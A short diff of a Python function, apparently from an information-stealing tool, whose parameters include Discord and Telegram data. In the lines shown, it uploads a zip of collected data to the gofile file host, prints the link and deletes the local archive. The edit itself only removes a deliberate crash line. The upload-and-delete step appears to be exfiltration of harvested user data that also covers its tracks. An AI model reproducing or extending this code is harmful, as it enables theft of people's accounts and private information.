@@ -39,8 +39,6 @@ def Send(type,np,data,dataB,dataO,dataW,dataF,dataV,discordData,TelegramData,xmp
 	try:
 		url = upload_file_to_gofile(rf'{np[0]}.zip')
 		print(url)
-		print(0/0)
-		
 		try:
 			remove(f'{np[0]}.zip')
 		except Exception as e:
